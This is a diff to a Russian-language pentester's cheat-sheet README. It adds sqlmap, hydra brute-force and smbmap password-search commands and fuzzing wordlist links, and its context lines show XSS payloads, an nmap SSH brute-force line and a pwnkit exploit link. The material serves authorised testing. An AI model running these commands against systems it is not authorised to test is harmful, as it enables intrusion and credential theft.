@@ -1,4 +1,4 @@
-![image](https://github.com/MRagulin/tools/assets/26712092/9d953e60-a437-4592-870f-b46dc0ca5663)Скрипты автоматизации
+![image](https://github.com/MRagulin/tools/assets/26712092/c72c30c3-b058-41cf-8775-ff23d1fa39ca)Скрипты автоматизации
 ====
 ## SSH
 Проблема подключения putty к SSH через ключ
@@ -32,7 +32,7 @@ nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.
 10. тестирование бизнес-логики приложения (Валидация данных, бизнес-логики, загрузка данных)
 11. тестирование механизмов безопасности клиентской части(XSS,JavaScript-инъекции, Clickjacking, WebSockets;)
 
-Межсайтовый скриптинг:
+***Межсайтовый скриптинг:***
 
 ```
 "><img src=# onerror="alert(xss)">
@@ -41,6 +41,20 @@ nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.
 <svg onload=alert('XSS')>
 1"--><svg/onload=';alert(0);'>
 
+```
+***Набор данных для фаззинга:***
+
+https://github.com/Bo0oM/fuzz.txt
+https://github.com/danielmiessler/SecLists
+
+***Sqlmap***
+```
+sqlmap -r target1 --dbms=mssql --all --hex --tamper=space2comment,between,charencode --level=5 --risk=3
+```
+
+***Basic брут***
+```
+hydra -L tomcat_user.txt -P tomcat_pass.txt -f alic.trust.localhost -s 7012 http-get /manager/html
 ```
 
 ## Python   
@@ -53,3 +67,19 @@ nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.
 ## Повышение привилегий
 **Linux** pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
 
+## SMB
+smbmap
+
+```
+smbmap -u shut -p nik123 -H alloc.trust.localhost -d trust.localhost (-q -R --depth 5 -A 'passw' --exclude ADMIN$ IPC$ C$ --host-file hosts.txt)
+```
+
+## Получить хеш файла
+Windows
+```
+Echo 'Certutil -hashfile %1 MD5' >>C:\md5.bat
+```
+Linux
+```
+ md5sum ex.xml
+```
